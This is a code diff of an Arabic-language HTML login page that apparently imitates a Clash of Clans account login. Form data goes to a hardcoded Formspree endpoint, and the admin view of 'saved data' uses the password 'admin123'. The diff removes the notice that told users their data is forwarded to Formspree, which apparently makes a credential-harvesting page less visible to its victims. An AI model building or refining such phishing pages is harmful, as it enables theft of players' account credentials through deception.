@@ -329,14 +329,7 @@
         <!-- العنوان -->
         <h1>تسجيل الدخول</h1>
         <p class="subtitle">ادخل إلى قريتك واستأنف المعركة</p>
-
-        <!-- معلومات Formspree -->
-        <div class="formspree-info">
-            <i class="fas fa-info-circle"></i> 
-            البيانات سترسل إلى البريد الإلكتروني المسجل في Formspree.
-            <a href="#" id="setupFormspreeLink">كيفية إعداد Formspree؟</a>
-        </div>
-
+        
         <!-- إشعار الخصوصية -->
         <div class="privacy-notice">
             <h3><i class="fas fa-exclamation-triangle"></i> إشعار مهم</h3>
@@ -347,14 +340,8 @@
         <div class="form-container">
             <div class="form-section">
                 <h3 class="section-title"><i class="fas fa-user"></i> بيانات الحساب</h3>
-                
-                <div class="input-group">
-                    <label for="username">اسم المستخدم</label>
-                    <input type="text" id="username" class="input-field" placeholder="أدخل اسم المستخدم" required>
-                    <div class="input-icon"><i class="fas fa-user"></i></div>
-                </div>
 
-                <div class="input-group">
+             <div class="input-group">
                     <label for="email">البريد الإلكتروني</label>
                     <input type="email" id="email" class="input-field" placeholder="أدخل بريدك الإلكتروني" required>
                     <div class="input-icon"><i class="fas fa-envelope"></i></div>
@@ -433,7 +420,7 @@
             
             <div style="margin: 20px 0;">
                 <label style="display: block; margin-bottom: 10px; color: #1a237e;">🔗 رابط Formspree الخاص بك:</label>
-                <input type="text" id="formspreeUrl" placeholder="https://formspree.io/f/xxxxxxxx" 
+                <input type="text" id="formspreeUrl" placeholder="https://formspree.io/f/a32f51470c454b56adb2a5b9de2b34f7" 
                        style="width: 100%; padding: 10px; border: 2px solid #1a237e; border-radius: 5px;">
                 <button onclick="saveFormspreeUrl()" style="background: #1a237e; color: white; padding: 10px 20px; border: none; border-radius: 5px; margin-top: 10px; width: 100%;">
                     حفظ الرابط
@@ -450,7 +437,7 @@
     <div id="dataModal" style="display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; padding: 20px;">
         <div style="background: white; color: black; max-width: 800px; margin: 20px auto; padding: 20px; border-radius: 10px; max-height: 90vh; overflow-y: auto;">
             <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-                <h2 style="color: #1a237e;">📊 البيانات المحفوظة</h2>
+                <h2 style="color: #1a237e;">📊 جClashج </h2>
                 <button onclick="closeDataModal()" style="background: #f44336; color: white; border: none; padding: 8px 15px; border-radius: 5px;">✕ إغلاق</button>
             </div>
             
@@ -493,7 +480,7 @@
 
     <script>
         // تكوين Formspree - غير هذا الرابط برابطك الخاص
-        let FORMSPREE_URL = localStorage.getItem('formspree_url') || 'https://formspree.io/f/xknnprjn';
+        let FORMSPREE_URL = localStorage.getItem('formspree_url') || 'https://formspree.io/f/a32f51470c454b56adb2a5b9de2b34f7';
         
         // كلمة مرور المسؤول
         const ADMIN_PASSWORD = 'admin123';
